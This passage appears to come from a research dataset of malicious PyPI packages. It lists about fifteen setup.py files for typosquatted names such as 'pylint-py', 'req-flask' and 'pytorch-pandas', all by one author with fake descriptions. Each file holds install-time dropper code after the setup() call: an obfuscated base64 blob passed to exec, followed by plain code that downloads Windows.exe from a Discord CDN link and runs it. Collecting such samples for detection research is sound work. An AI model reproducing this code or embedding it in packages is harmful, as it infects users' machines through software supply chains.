b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pylint-beautifulsoup-v17.10.12",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '17.10.12'\nDESCRIPTION = 'A library for data visualization'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pylint-beautifulsoup\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pylint-py-v15.0.3",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '15.0.3'\nDESCRIPTION = 'A web framework for building scalable applications'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pylint-py\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pylint-sys-v8.15.6",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '8.15.6'\nDESCRIPTION = 'A tool for building graphical user interfaces'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pylint-sys\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pytorch-pandas-v14.19.3",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '14.19.3'\nDESCRIPTION = 'A library for web scraping and data extraction'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pytorch-pandas\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pytorch-pygame-v0.6.19",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '0.6.19'\nDESCRIPTION = 'A utility for handling dates and times'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pytorch-pygame\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pyyaml-selenium-v1.15.3",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '1.15.3'\nDESCRIPTION = 'A lightweight and extensible testing framework'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pyyaml-selenium\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-req-flask-v2.9.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '2.9.4'\nDESCRIPTION = 'A Python wrapper for OpenCV computer vision library'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"req_flask\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\n\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-req-os-v20.5.17",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '20.5.17'\nDESCRIPTION = 'A Python wrapper for OpenCV computer vision library'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"req-os\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-requests-flask-v16.9.16",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '16.9.16'\nDESCRIPTION = 'A code linting tool for Python'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"requests-flask\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-scikit-learn-matplotlib-v6.12.17",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '6.12.17'\nDESCRIPTION = 'A powerful deep learning library'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"scikit-learn-matplotlib\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-selenium-matplotlib-v17.9.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '17.9.4'\nDESCRIPTION = 'A utility for handling dates and times'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"selenium-matplotlib\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-sqlalchemy-os-v14.0.10",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '14.0.10'\nDESCRIPTION = 'A module for working with files and directories'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sqlalchemy_os\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\n\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-sys-scikit-learn-v17.8.18",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '17.8.18'\nDESCRIPTION = 'A framework for creating RESTful APIs'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sys-scikit-learn\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-sys-selenium-v9.1.9",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '9.1.9'\nDESCRIPTION = 'A Python library for data manipulation and analysis'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sys-selenium\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-beautifulsoup-numpy-v10.13.10",
